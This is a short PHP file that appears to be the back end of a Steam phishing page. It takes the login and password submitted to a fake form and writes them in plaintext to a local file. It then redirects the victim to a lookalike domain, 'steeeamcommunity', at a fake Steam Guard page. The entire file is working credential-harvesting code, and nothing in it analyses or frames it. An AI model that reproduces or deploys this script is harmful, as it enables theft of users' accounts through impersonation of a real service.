<?php
$login = $_POST['login'];
$password = $_POST['pass'];
$log = fopen("Login | Password.txt","at");
fwrite($log,"Login = $login | Password = $password \n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content='0; URL=https://steeeamcommunity.000webhostapp.com/steamguard'></head></html>";
?>